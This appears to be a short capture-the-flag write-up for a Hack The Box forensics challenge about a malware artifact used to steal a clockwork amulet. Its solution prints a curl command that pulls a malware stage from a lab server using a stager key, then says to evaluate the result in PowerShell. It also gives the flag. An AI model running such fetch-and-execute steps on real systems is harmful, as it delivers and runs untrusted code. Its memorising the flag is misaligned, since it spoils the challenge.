# Thorins_Amulet
*Garrick and Thorin’s visit to Stonehelm took an unexpected turn when Thorin’s old rival, Bron Ironfist, challenged him to a forging contest. In the end Thorin won the contest with a beautifully engineered clockwork amulet but the victory was marred by an intrusion. Saboteurs stole the amulet and left behind some tracks. Because of that it was possible to retrieve the malicious artifact that was used to start the attack. Can you analyze it and reconstruct what happened? Note: make sure that domain korp.htb resolves to your docker instance IP and also consider the assigned port to interact with the service.*

## Solution
1. Some simple powershell forensics, basically just do `curl 94.237.54.176:38855/a541a -H "X-ST4G3R-KEY: 5337d322906ff18afedc1edc191d325d"` and then eval the result with powershell.


## Flag
**Flag:** `HTB{7h0R1N_H45_4lW4Y5_833n_4N_9r347_1NV3n70r}`
